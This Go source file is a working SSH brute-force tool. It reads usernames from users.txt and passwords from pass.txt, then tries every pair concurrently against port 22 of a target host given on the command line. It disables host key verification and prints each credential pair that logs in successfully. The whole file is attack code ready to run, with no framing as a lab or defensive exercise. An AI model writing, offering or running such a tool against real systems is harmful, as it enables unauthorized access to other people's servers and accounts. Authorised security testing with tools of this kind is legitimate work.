package main

import (
	"bufio"
	"fmt"
	"os"
	"sync"

	"golang.org/x/crypto/ssh"
)

const (
	ColorGreen = "\033[32m"
	ColorRed   = "\033[31m"
	ColorReset = "\033[0m"
	TextBold   = "\033[1m"
	TextUnbold = "\033[21m"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <host>")
		return
	}

	host := os.Args[1]

	usersFile, err := os.Open("users.txt")
	if err != nil {
		fmt.Println("Error opening users file:", err)
		return
	}
	defer usersFile.Close()

	passFile, err := os.Open("pass.txt")
	if err != nil {
		fmt.Println("Error opening password file:", err)
		return
	}
	defer passFile.Close()

	passScanner := bufio.NewScanner(passFile)
	var passwords []string
	for passScanner.Scan() {
		passwords = append(passwords, passScanner.Text())
	}

	usersScanner := bufio.NewScanner(usersFile)
	var users []string
	for usersScanner.Scan() {
		users = append(users, usersScanner.Text())
	}

	var wg sync.WaitGroup
	for _, user := range users {

		for _, pass := range passwords {
			wg.Add(1) // Increment wait group inside the password loop

			go func(user, pass string) {
				defer wg.Done()

				config := &ssh.ClientConfig{
					User: user,
					Auth: []ssh.AuthMethod{
						ssh.Password(pass),
					},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Not recommended for production
				}

				conn, err := ssh.Dial("tcp", host+":22", config)
				if err != nil {
					fmt.Printf("%sFailed to connect with %s:%s %s\n", ColorRed, user, pass, ColorReset)
					return
				}
				defer conn.Close()

				fmt.Printf("%sConnected to %s with %s:%s%s\n", ColorGreen+TextBold, host, user, pass, ColorReset)
			}(user, pass)
		}
	}

	wg.Wait()
}
